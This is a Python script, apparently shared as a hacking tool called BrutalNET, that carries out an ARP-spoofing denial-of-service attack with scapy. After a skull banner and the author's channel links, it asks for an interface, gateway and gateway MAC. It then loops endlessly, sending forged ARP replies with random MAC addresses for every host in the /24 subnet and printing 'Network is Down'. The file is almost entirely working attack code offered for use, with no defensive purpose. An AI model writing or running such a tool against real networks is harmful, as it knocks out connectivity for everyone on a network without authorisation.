# Author: cybermad
# BrutalNET A DoS denial-of-service through ARP Spoofing.
# sends ARP packets to every host on the network poisoning its ARP table.
# When the ARP table becomes corrupted, the data flow is completely distorted, leading to network failure.

from scapy.all import *
import ipaddress
import threading

h = "\033[38;5;118m"
c = "\033[91m"
b = "\033[41m"
g = "\033[92m"
r = "\033[0m"

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{c}
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
      
{r}    
    {g}[*]{r}      {h}ARP Spoofing Tool.{r}               {g}[*]{r} 
    {g}[*]{r}      {h}Version : 1.0{r}                    {g}[*]{r} 
    {g}[*]{r}      {h}Created :{c} {c}cybermad{r}               {g}[*]{r}
    {g}[*]{r}      {h}github  : github.com/cybermads{r}   {g}[*]{r}
    {g}[*]{r}      {h}youtube : youtube.com/@cybermads{r} {g}[*]{r}
            
    {c}ARP Network denial of service.{r}
          """)

def arp(host, gateway, mac, iface):
    # poison arp cache
    gateway_packet = ARP(op=2, psrc=host, pdst=gateway, hwdst=mac, hwsrc=RandMAC())
    sendp(Ether(dst=mac) / gateway_packet, iface=iface, verbose=0)
    broadcast_packet = ARP(op=2, psrc=gateway, pdst=host, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=RandMAC())
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / broadcast_packet, iface=iface, verbose=0)

def attack(gateway, mac, iface):
    # Generate all /24 IPv4 hosts
    # thread host to send ARP packets
    while True:
        ipv4 = ipaddress.IPv4Network(f"{gateway}/24", strict=False)
        lists = [str(ip) for ip in ipv4.hosts() if str(ip) != gateway]
        
        for ip in lists:
            t = threading.Thread(target=arp, args=(ip, gateway, mac, iface))
        t.start()
        
def arpspoof():
    banner()
    iface = input(f"[{c}+{r}] interface{c}:{r} ")
    gateway = input(f"[{c}+{r}] gateway{c}:{r} ")
    mac = input(f"[{c}+{r}] gateway mac{c}:{r} ")
    subnet = ipaddress.IPv4Network(f"{gateway}/24", strict=False)
    print(f"[{g}*{r}] Start Attack{g}...{r}")
    print(f"[{g}+{r}] {b}{iface}{r} {b}{subnet}{r}  {g}>{r} {gateway}{g}::{r}{mac} {g}send ARP packet...{r}")
    time.sleep(2)
    print(f"[{g}+{r}] {b}{iface}{r} {b}{subnet}{r}  {g}>{r} {gateway}{g}::{r}{mac} {c}Network is Down !!{r}")
    attack(gateway, mac, iface)

